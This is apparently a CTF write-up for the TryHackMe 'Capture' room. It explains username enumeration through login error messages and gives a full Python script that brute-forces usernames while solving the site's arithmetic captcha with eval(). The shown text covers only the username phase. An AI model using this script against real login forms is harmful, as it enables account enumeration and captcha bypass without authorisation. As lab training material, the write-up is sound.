# Capture(TryHackMe)

Link to TryHackMe Room [https://tryhackme.com/room/capture](https://tryhackme.com/room/capture)

<img src="https://user-images.githubusercontent.com/25124463/236878216-64d5ac34-8a10-4814-9621-64c2c4af9306.png" width="600">




In this CTF room from TryHackMe I will be attempting to bypass a login form.&#x20;



### Enumeration&#x20;

After starting the machine and navigating to the login page this is what we are presented with. 

<img src="https://user-images.githubusercontent.com/25124463/236878987-fe6d22dd-2c2a-4113-ac5f-cd7bc0543316.png" width="600">


When entering the username ``admin`` and password ``admin`` as a test I see that I get an output at the bottom of the page saying:

**Error: The user 'admin' does not exist**

This means that we can brute force the login to find the username and observe for when the response does not contain the above error message indicating that username exists. 
We could do this on Burp Suite using the included username wordlist but the site has captcha in place after too many unsucessful login attempts.

<details>
<summary>Captcha</summary>

![captcha](https://user-images.githubusercontent.com/25124463/236881474-84571341-c715-4e2f-a9ab-dea7cb25b17c.png)
</details>

Since we now have to solve each captcha we must create a script to do this. I decided to use python to make my script. 

The username hacking script must do the following:
* Read each line of the ``usernames.txt`` file 
* Send the request with the login url and username/password payload. The password at this point is not important so we can give it a dummy value. Main goal is to find a valid username. 
* When captcha is found in the response we must solve it and include it in the request payload. 
* Loop through usernames and halt the script when a response returns html code that doesn't include ``Error: The user 'admin' does not exist``. 

My solution might not be most elegant but it works to find the username lol
<details>
<summary>Code</summary>

```

import requests
import re

url = '' # replace with the URL of the login page

with open('usernames.txt', 'r') as uf:
    for username in uf:
        username = username.strip()
        
        payload = {
            "username" : username,
            "password" : "test_password"
        }

        response = requests.post(url, data=payload)

        if  "Invalid password for user"in response.text:
            print(f"Correct username: {username}")
            exit()
        else:
            # Solve CAPTCHA if present and send login request
            captcha_match = re.search(r'\d+\s*[-+/*]\s*\d+\s*=\s*\?',response.text)
            captcha_text = ''
            if captcha_match is not None:
                captcha_text = captcha_match.group(0).replace('=', '').strip()
                print("CAPTCHA text:", captcha_text)

                # Solve the CAPTCHA and include the solution in the payload
                match = re.search(r'(\d+)\s*([-+/*]?)\s*(\d+)', captcha_text)
                if match:
                    num1, operator, num2 = match.groups()
                    solution = eval(num1 + operator + num2)
                    print("Solution:", solution)
                    print(username)
                    payload['captcha'] = solution
                else:
                    print("Error: Failed to extract numbers and operator from CAPTCHA text")
                    continue
            
            # Send login request
            response = requests.post(url, data=payload)

            if "Invalid password for user" in response.text:
                print(f"Valid username: {username}")
                exit()



```
</details>
